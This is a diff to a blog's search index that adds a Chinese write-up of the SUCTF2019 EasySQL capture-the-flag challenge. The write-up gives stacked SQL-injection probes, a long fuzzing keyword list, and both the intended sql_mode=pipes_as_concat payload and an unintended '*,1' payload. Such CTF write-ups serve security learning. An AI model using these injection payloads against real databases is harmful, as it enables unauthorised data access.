@@ -4,6 +4,35 @@
   
   
   <entry>
+    <title>SUCTF2019 EasySQL记录</title>
+    <link href="/newblog/2020/03/16/SUCTF2019-EasySQL%E8%AE%B0%E5%BD%95/"/>
+    <url>/newblog/2020/03/16/SUCTF2019-EasySQL%E8%AE%B0%E5%BD%95/</url>
+    
+    <content type="html"><![CDATA[<p>先打开测试一下，有三种，分别是array，nonono，无回显。可以堆叠注入</p><pre><code>1;show databases;1;show tables;</code></pre><h2 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h2><p>fuzz,这里贴上一些关键字</p><pre><code>length +handlerlikeselect sleepdatabasedeletehavingoras-~BENCHMARKlimitleftselectinsertright#--+INFORMATION--;!%+xor&lt;&gt;(&gt;&lt;).^=ANDBYCASTCOLUMNCOUNTCREATEENDcase&#39;1&#39;=&#39;1whenadmin&#39;&quot;length +lengthREVERSEasciiselect databaseleftrightunion&quot;&amp;&amp;&amp;||oorr/////**/*/**/ananddGROUPHAVINGIFINTOJOINLEAVELEFTLEVELsleepLIKENAMESNEXTNULLOFON|infromation_schemauserORORDERORDSCHEMASELECTSETTABLETHENUNIONUPDATEUSERUSINGVALUEVALUESWHENWHEREADDANDpreparesetupdatedeletedropinsetCASTCOLUMNCONCATGROUP_CONCATgroup_concatCREATEDATABASEDATABASESalterDELETEDROPfloorrand()information_schema.tablesTABLE_SCHEMA%dfconcat_ws()concatLIMITORDONextractvalueorder CAST()byORDEROUTFILERENAMEREPLACESCHEMASELECTSETupdatexmlSHOWSQLTABLETHENTRUEinstrbenchmarkformatbinsubstringordUPDATEVALUESVARCHARVERSIONWHENWHERE/*`,users%0a%0bmidforBEFOREREGEXPRLIKEinsys schemmaSEPARATORXORCURSORFLOORsys.schema_table_statistics_with_bufferINFILEcount%0cfrom%0d%a0=@else</code></pre><p>这里插一句，如果bp代理监听器勾选不上的话，可能是端口占用。先查找端口占用的进程<code>netstat -ano | findstr 8080</code>，再把这个进程关掉就好了。</p><h2 id="sql-mode"><a href="#sql-mode" class="headerlink" title="sql_mode"></a>sql_mode</h2><p>sql_mode定义了MySQL应支持的SQL语法，以及应该在数据上执行何种确认检查，其中的<code>PIPES_AS_CONCAT</code>将<code>||</code>视为字符串的连接操作符而非 “或” 运算符。<br><img src="http://120.26.91.51:4001/uploads/big/1020ec590df5cd332773b760656b94e2.png" srcset="/newblog/img/loading.gif" alt="sql_mode"><br>这个模式下拼接字母会出错，只能拼接数字。</p><h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>这是一个堆叠注入</p><pre><code>payload:1;set sql_mode=pipes_as_concat;select 1</code></pre><p>源码里的语句是<code>select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag</code>,现在就能够理解了。</p><h2 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h2><p><code>payload</code>:<code>*,1</code><br>拼接一下:<code>select *,1||flag from Flag</code>等同于<code>select *,1 from Flag</code></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>web</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>sql</tag>
+      
+      <tag>注入</tag>
+      
+      <tag>web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>docker+Lychee搭建自己的图床</title>
     <link href="/newblog/2020/03/16/docker-Lychee%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/"/>
     <url>/newblog/2020/03/16/docker-Lychee%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/</url>
